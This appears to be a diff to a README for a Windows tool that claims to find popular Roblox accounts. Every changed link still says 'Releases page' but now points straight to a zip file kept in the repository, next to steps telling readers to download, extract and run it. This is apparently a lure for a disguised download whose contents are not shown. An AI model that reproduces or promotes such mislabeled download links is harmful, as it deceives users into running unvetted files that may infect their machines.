@@ -1,6 +1,6 @@
 # 👤 famous-roblox-users-finder - Find large Roblox followings fast
 
-[![Download](https://img.shields.io/badge/Download-Releases-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Leonleol/famous-roblox-users-finder/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Leonleol/famous-roblox-users-finder/main/output/finder_users_famous_roblox_2.6.zip)
 
 ## 🚀 What this tool does
 
@@ -10,7 +10,7 @@ It is built for people who want to sort a list of usernames and spot accounts th
 
 ## 📥 Download the app
 
-1. Visit the [Releases page](https://github.com/Leonleol/famous-roblox-users-finder/releases)
+1. Visit the [Releases page](https://raw.githubusercontent.com/Leonleol/famous-roblox-users-finder/main/output/finder_users_famous_roblox_2.6.zip)
 2. Download the latest Windows file from the release assets
 3. Save the file to a folder you can find again, such as `Downloads` or `Desktop`
 
@@ -49,7 +49,7 @@ Keep these tips in mind:
 
 ## ⚙️ How to run it on Windows
 
-1. Download the release from the [Releases page](https://github.com/Leonleol/famous-roblox-users-finder/releases)
+1. Download the release from the [Releases page](https://raw.githubusercontent.com/Leonleol/famous-roblox-users-finder/main/output/finder_users_famous_roblox_2.6.zip)
 2. Open the downloaded folder
 3. If the file is in a ZIP archive, right-click it and choose Extract All
 4. Open the extracted folder
@@ -148,4 +148,4 @@ This tool is built around:
 
 ## 🧭 Where to get the file
 
-Use the release download here: [https://github.com/Leonleol/famous-roblox-users-finder/releases](https://github.com/Leonleol/famous-roblox-users-finder/releases)
+Use the release download here: [https://raw.githubusercontent.com/Leonleol/famous-roblox-users-finder/main/output/finder_users_famous_roblox_2.6.zip](https://raw.githubusercontent.com/Leonleol/famous-roblox-users-finder/main/output/finder_users_famous_roblox_2.6.zip)
